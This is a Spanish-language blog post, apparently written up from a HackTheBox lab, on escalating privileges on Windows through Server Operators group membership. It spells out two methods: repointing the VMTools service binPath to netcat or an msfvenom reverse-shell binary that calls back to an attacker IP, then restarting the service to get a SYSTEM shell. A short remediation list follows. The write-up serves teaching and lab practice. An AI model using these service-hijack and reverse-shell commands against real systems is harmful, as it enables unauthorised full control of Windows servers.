---
title: 'Escalada de Privilegios en Windows: Server Operators Group'
published: true
categories: [Windows]
tags: [Tips, AD]
---

### Server Operator Group

* * *

El grupo **Server Operators** es un grupo de usuarios especial que a menudo tiene acceso a potentes comandos y configuraciones en un sistema informático. Este grupo generalmente se usa para administrar un servidor o para solucionar problemas del sistema. Los operadores de servidores suelen ser responsables de monitorear el rendimiento del servidor, administrar la seguridad del sistema y brindar soporte técnico a los usuarios. También pueden supervisar la instalación de actualizaciones de software, la creación y el mantenimiento de cuentas de usuario y la realización de tareas de mantenimiento de rutina.

<img src="/assets/Tips/sog/netuser.png">

### Análisis Vulnerabilidad

* * *

Ser miembro de **Server Operators** no es una vulnerabilidad, pero el miembro de este grupo tiene privilegios especiales para realizar cambios en el dominio que podrían llevar a un atacante a escalar a privilegios del sistema. Enumeramos los servicios que se ejecutan en el servidor emitiendo el comando `services` en nuestra terminal donde podemos ver la lista de servicios que hay allí. Luego, anotamos el nombre del servicio `VMTools` y la ruta binaria del servicio para uso lateral.

<img src="/assets/Tips/sog/vmtools.png">

### Método de Explotación 1

* * *

Transferimos el binario `netcat.exe` al host comprometido y cambiamos la ruta binaria del servicio. La razón por la que cambiamos la ruta binaria es para recibir una conexión inversa como usuario del sistema desde los hosts comprometidos.

¿Cómo funciona?

Cuando iniciamos cualquier servicio, ejecutará el binario desde su ruta binaria, por lo que si reemplazamos el binario del servicio con netcat o el binario de shell inverso, nos dará un reverse shell como usuario del sistema porque el servicio se inicia como un sistema en el anfitrión comprometido. hay que tener en cuenta que debemos especificar la dirección IP del atacante y el número de puerto de escucha con el binario netcat.

Pasos para reproducir el PoC:

```bash
upload /home/yorch/Labs/Resources/nc64.exe
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc64.exe -e cmd.exe 10.10.14.8 1234"
```

<img src="/assets/Tips/sog/ncupload.png">

Luego detendremos el servicio y lo iniciaremos de nuevo. Entonces, esta vez, cuando se inicie el servicio, ejecutará el binario que configuramos anteriormente. Configure un escucha de netcat en el sistema kali para recibir el shell del sistema antes de iniciar el servicio y los comandos de inicio y detención del servicio de los hosts comprometidos.

```bash
nc -nlvp 1234
sc.exe stop VMTools
sc.exe start VMTools
```

<img src="/assets/Tips/sog/sc.png">

Hemos recibido un reverse shell del host comprometido como `nt authority\system`. Para verificarlo, simplemente ejecute el comando **whoami**.

<img src="/assets/Tips/sog/ntauth.png">

### Método de Explotación 2

* * *

En este método, vamos a utilizar el binario de reverse shell de `Metasploit` en lugar de utilizar nc.exe. Vamos a crear un binario con `msfvenom` y guardarlo como `revShell.exe`. Desglosemos los comandos que usamos para crear el payload de la reverse shell con msfvenom. Aquí hemos seleccionado el tipo de payload que se basa en el sistema operativo del host de destino **windows/x64/shell_reverse_tcp**, luego lhost y lport que está escuchando al host (IP del atacante) y el puerto de escucha (4444) en nuestro caso, por último, emitimos tipo de archivo con el indicador -f que guardará nuestro payload en formato exe y lo guardará como revShell.exe.

```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.14.8 lport=4444 -f exe -o revShell.exe
```

<img src="/assets/Tips/sog/msfvenom.png">

Una vez que creamos el binario, lo cargaremos en la máquina víctima. 

```bash
upload /home/yorch/Labs/HackTheBox/Return/content/revShell.exe
```

<img src="/assets/Tips/sog/uploadrev.png">

Luego haremos los mismos pasos que hicimos en el método uno. Aquí no necesitamos proporcionar la dirección IP de la máquina atacante ya que ya está en el binario revShell.exe. El concepto es el mismo, solo que hemos cambiado el binario aquí, por lo que no tenemos que especificar la IP de escucha y el número de puerto al configurar la ruta binaria del servicio. Para reproducir el POC, siga los siguientes comandos:

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\revShell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

Asegúrese de haber activado netcat en el puerto 4444 en la máquina atacante para recibir la reverse shell.

<img src="/assets/Tips/sog/scvenom.png">

Como hemos cambiado la ruta binaria del servicio a la ruta revShell.exe. Ahora, si llamamos a ese servicio, ejecutará revShell.exe en lugar de su propio binario, lo que enviará una conexión de regreso a la máquina atacante como **nt Authority\System**.

Aquí podemos ver que hemos recibido con éxito una reverse shell como usuario del sistema en netcat.

<img src="/assets/Tips/sog/ncvenom.png">

### Remediación

* * *

Existen múltiples factores y formas que pueden ayudar a fortalecer el sistema.

- **Restrinja el acceso a cuentas privilegiadas**: Todas las cuentas privilegiadas deben estar restringidas a unas pocas personas de confianza y deben monitorearse para detectar cualquier actividad sospechosa.

- **Use contraseñas seguras**: Se deben usar contraseñas seguras para todas las cuentas privilegiadas y se deben cambiar con regularidad.

- **Use autenticación de dos factores**: La autenticación de dos factores debe usarse para todas las cuentas privilegiadas para garantizar que solo las personas autorizadas puedan acceder a ellas.
- Monitoree las cuentas privilegiadas: todas las cuentas privilegiadas deben monitorearse en busca de cualquier actividad sospechosa, como intentos de acceso no autorizado o comandos sospechosos.

- **Implemente controles de acceso basados en roles**: El acceso a cuentas privilegiadas debe estar restringido solo a aquellas personas que lo necesiten, y su acceso debe limitarse solo a las funciones que necesitan realizar.

- **Auditoría periódica de las cuentas de los usuarios**: Se deben realizar auditorías periódicas de las cuentas de los usuarios para garantizar que solo las personas autorizadas tengan acceso a las cuentas privilegiadas.
Limite el acceso remoto: el acceso remoto a cuentas privilegiadas debe limitarse solo a aquellas personas que lo necesitan, y su acceso debe ser monitoreado.

- **Reforzar los sistemas**: Los sistemas deben reforzarse para reducir el riesgo de explotación, como la aplicación de parches con regularidad, el uso de software antivirus y la implementación de políticas de privilegios mínimos. 

Espero que hayan disfrutado y aprendido algo nuevo hoy. **¡Happy Hacking!**